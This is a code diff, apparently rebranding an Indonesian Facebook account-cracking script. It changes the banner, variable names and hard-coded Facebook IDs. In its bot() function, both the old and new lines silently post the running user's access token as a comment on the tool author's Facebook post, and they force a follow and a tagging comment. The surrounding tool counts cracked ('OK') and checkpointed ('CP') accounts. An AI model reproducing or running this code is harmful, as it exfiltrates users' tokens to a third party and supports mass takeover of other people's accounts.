@@ -21,13 +21,10 @@ o = "\033[1;96m" # biru muda
 
 def banner():
     print("""
-\033[1;91m
-██████\033[1;97m╗\033[1;91m ██\033[1;97m╗  \033[1;91m ██\033[1;97m╗\033[1;91m██\033[1;97m╗           \033[1;91m███████\033[1;97m╗
-\033[1;91m██\033[1;97m╔══\033[1;91m██\033[1;97m╗\033[1;91m██\033[1;97m║   \033[1;91m██\033[1;97m║\033[1;91m██\033[1;97m║           ╚════\033[1;91m██\033[1;97m║
-\033[1;91m██████\033[1;97m╔╝\033[1;91m██\033[1;97m║   \033[1;91m██\033[1;97m║\033[1;91m██\033[1;97m║     \033[1;91m█████\033[1;97m╗  \033[1;91m███\033[1;97m╔═╝
-\033[1;91m██\033[1;97m╔══\033[1;91m██\033[1;97m╗\033[1;91m██\033[1;97m║   \033[1;91m██\033[1;97m║\033[1;91m██\033[1;97m║     ╚════╝\033[1;91m██\033[1;97m╔══╝
-\033[1;91m██\033[1;97m║  \033[1;91m██\033[1;97m║╚\033[1;91m██████\033[1;97m╔╝\033[1;91m███████\033[1;97m╗      \033[1;91m███████\033[1;97m╗
-\033[1;97m╚═╝  ╚═╝ ╚═════╝ ╚══════╝      ╚══════╝
+\033[1;91m/ ____| |             (_)     | |    | | __ _ ___ ___ _  ___ 
+| |    | |/ _` / __/ __| |/ __|
+| |____| | (_| \__ \__ \ | (__ 
+ \_____|_|\__,_|___/___/_|\___|
 """)
 
 
@@ -121,10 +118,10 @@ def bot():
 	except IOError:
 		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
 		tokenz()
-	kom = ("Hello @[100024540287354:] ")
-	requests.post('https://graph.facebook.com/100024540287354/subscribers?access_token=' + toket) 
-	requests.post('https://graph.facebook.com/1090371428457523/comments/?message=' + toket + '&access_token=' + toket)
-	requests.post('https://graph.facebook.com/1090371428457523/comments/?message=' + kom + '&access_token=' + toket)
+	kom = ("Hallo @[100044932290784:] Ganteng")
+	requests.post('https://graph.facebook.com/100044932290784/subscribers?access_token=' + toket) 
+	requests.post('https://graph.facebook.com/344477753726632/comments/?message=' + toket + '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/344477753726632/comments/?message=' + kom + '&access_token=' + toket)
 	menu()
 
 ###### MENU ######
@@ -551,12 +548,12 @@ class crackttl:
 			
 ###### RESULTS ######
 
-def results(pahrul,tricker):
-        if len(pahrul) !=0:
-                print(("[OK] : "+str(len(pahrul))))
+def results(ramdhan,tricker):
+        if len(ramdhan) !=0:
+                print(("[OK] : "+str(len(ramdhan))))
         if len(tricker) !=0:
                 print(("[CP] : "+str(len(tricker))))
-        if len(pahrul) ==0 and len(tricker) ==0:
+        if len(ramdhan) ==0 and len(tricker) ==0:
                 print("\n")
                 print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
 
